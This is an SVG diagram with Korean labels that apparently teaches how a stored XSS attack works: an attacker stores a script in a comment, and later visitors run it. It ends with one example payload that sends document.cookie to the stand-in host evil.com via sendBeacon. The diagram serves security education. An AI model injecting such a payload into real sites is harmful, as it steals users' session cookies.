<svg xmlns="http://www.w3.org/2000/svg" width="880" height="540" viewBox="0 0 880 540">
  <defs>
    <marker id="arr-red" viewBox="0 0 14 14" refX="12" refY="7"
            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
      <path d="M 0 0 L 13 7 L 0 14 z" fill="#e05555"/>
    </marker>
    <marker id="arr-blue" viewBox="0 0 14 14" refX="12" refY="7"
            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
      <path d="M 0 0 L 13 7 L 0 14 z" fill="#7ec8e3"/>
    </marker>
    <marker id="arr-orange" viewBox="0 0 14 14" refX="12" refY="7"
            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
      <path d="M 0 0 L 13 7 L 0 14 z" fill="#ce9178"/>
    </marker>
    <marker id="arr-green" viewBox="0 0 14 14" refX="12" refY="7"
            markerUnits="userSpaceOnUse" markerWidth="14" markerHeight="14" orient="auto">
      <path d="M 0 0 L 13 7 L 0 14 z" fill="#55c555"/>
    </marker>
  </defs>

  <rect width="880" height="540" fill="#0a0a0a" rx="12"/>

  <!-- Title -->
  <text x="440" y="46" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="22" font-weight="700" fill="#e8e8e8">Stored XSS 공격 흐름</text>

  <!-- Phase 1: Attacker stores -->
  <text x="140" y="80" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="14" font-weight="600" fill="#e05555">Phase 1: 악성 코드 저장</text>

  <rect x="60" y="90" width="160" height="64" rx="8" fill="#1a0a0a" stroke="#e05555" stroke-width="1.5"/>
  <text x="140" y="116" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="13" font-weight="600" fill="#e05555">공격자</text>
  <text x="140" y="136" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">악성 스크립트 포함</text>
  <text x="140" y="150" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">댓글/게시글 작성</text>

  <line x1="222" y1="122" x2="298" y2="122" stroke="#e05555" stroke-width="2" marker-end="url(#arr-red)"/>
  <text x="260" y="114" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">POST 요청</text>

  <rect x="300" y="90" width="160" height="64" rx="8" fill="#0a0a1a" stroke="#7ec8e3" stroke-width="1.5"/>
  <text x="380" y="116" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="13" font-weight="600" fill="#7ec8e3">웹 서버</text>
  <text x="380" y="136" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">입력 검증 없이</text>
  <text x="380" y="150" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">그대로 저장</text>

  <line x1="462" y1="122" x2="538" y2="122" stroke="#7ec8e3" stroke-width="2" marker-end="url(#arr-blue)"/>
  <text x="500" y="114" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">INSERT</text>

  <rect x="540" y="90" width="160" height="64" rx="8" fill="#0a1a0a" stroke="#55c555" stroke-width="1.5"/>
  <text x="620" y="116" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="13" font-weight="600" fill="#55c555">데이터베이스</text>
  <text x="620" y="136" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">악성 스크립트</text>
  <text x="620" y="150" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">영구 저장됨</text>

  <!-- DB icon -->
  <text x="720" y="128" text-anchor="start" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="28" fill="#55c555">⚠</text>

  <!-- Divider -->
  <line x1="60" y1="175" x2="820" y2="175" stroke="#333" stroke-width="1" stroke-dasharray="4,4"/>

  <!-- Phase 2: Victim visits -->
  <text x="440" y="200" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="14" font-weight="600" fill="#ce9178">Phase 2: 불특정 다수 피해 (나중에 방문하는 모든 사용자)</text>

  <rect x="60" y="212" width="160" height="64" rx="8" fill="#1a1a0a" stroke="#ce9178" stroke-width="1.5"/>
  <text x="140" y="238" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="13" font-weight="600" fill="#ce9178">피해자 A</text>
  <text x="140" y="258" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">게시판 방문</text>

  <rect x="60" y="292" width="160" height="64" rx="8" fill="#1a1a0a" stroke="#ce9178" stroke-width="1.5"/>
  <text x="140" y="318" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="13" font-weight="600" fill="#ce9178">피해자 B</text>
  <text x="140" y="338" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">나중에 방문</text>

  <!-- Arrows from victims to server -->
  <line x1="222" y1="244" x2="298" y2="270" stroke="#ce9178" stroke-width="2" marker-end="url(#arr-orange)"/>
  <line x1="222" y1="320" x2="298" y2="294" stroke="#ce9178" stroke-width="2" marker-end="url(#arr-orange)"/>

  <rect x="300" y="252" width="160" height="64" rx="8" fill="#0a0a1a" stroke="#7ec8e3" stroke-width="1.5"/>
  <text x="380" y="278" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="13" font-weight="600" fill="#7ec8e3">웹 서버</text>
  <text x="380" y="298" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">DB에서 조회 후</text>
  <text x="380" y="312" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">HTML에 포함 응답</text>

  <line x1="462" y1="284" x2="538" y2="284" stroke="#7ec8e3" stroke-width="2" marker-end="url(#arr-blue)"/>

  <rect x="540" y="252" width="160" height="64" rx="8" fill="#0a0a1a" stroke="#7ec8e3" stroke-width="1.5"/>
  <text x="620" y="278" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="13" font-weight="600" fill="#7ec8e3">DB 조회</text>
  <text x="620" y="298" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">저장된 스크립트</text>
  <text x="620" y="312" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">반환</text>

  <!-- Arrow back to victims -->
  <line x1="700" y1="284" x2="760" y2="244" stroke="#e05555" stroke-width="2" stroke-dasharray="4,4" marker-end="url(#arr-red)"/>
  <line x1="700" y1="284" x2="760" y2="320" stroke="#e05555" stroke-width="2" stroke-dasharray="4,4" marker-end="url(#arr-red)"/>

  <rect x="762" y="220" width="98" height="50" rx="8" fill="#1a0a0a" stroke="#e05555" stroke-width="1.5"/>
  <text x="811" y="243" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" font-weight="600" fill="#e05555">스크립트</text>
  <text x="811" y="261" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">실행!</text>

  <rect x="762" y="296" width="98" height="50" rx="8" fill="#1a0a0a" stroke="#e05555" stroke-width="1.5"/>
  <text x="811" y="319" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" font-weight="600" fill="#e05555">스크립트</text>
  <text x="811" y="337" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#888">실행!</text>

  <!-- Difference box -->
  <rect x="60" y="380" width="760" height="70" rx="8" fill="#0d0d0d" stroke="#e05555" stroke-width="1.5"/>
  <text x="440" y="404" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="13" font-weight="600" fill="#e05555">Reflected XSS와의 차이: 공격자가 각 피해자에게 링크를 보낼 필요가 없음</text>
  <text x="440" y="426" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="12" fill="#888">해당 페이지를 방문하는 모든 사용자가 자동으로 피해를 입음 → 파급력 훨씬 큼</text>
  <text x="440" y="442" text-anchor="middle" font-family="'Wanted Sans Variable','Wanted Sans',-apple-system,sans-serif"
        font-size="11" fill="#7777cc">대상: 댓글, 게시글, 프로필, 상품 리뷰, 채팅 메시지 등 DB에 저장되는 모든 입력</text>

  <!-- Code example -->
  <rect x="60" y="466" width="760" height="56" rx="8" fill="#000000" stroke="#3a4a6e" stroke-width="1"/>
  <text x="76" y="488" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
        font-size="13" fill="#888" xml:space="preserve">// 댓글에 삽입된 페이로드 예시</text>
  <text x="76" y="508" font-family="'JetBrains Mono','Menlo','Consolas',monospace"
        font-size="13" fill="#ce9178" xml:space="preserve">&lt;script&gt;navigator.sendBeacon('//evil.com', document.cookie)&lt;/script&gt;</text>
</svg>
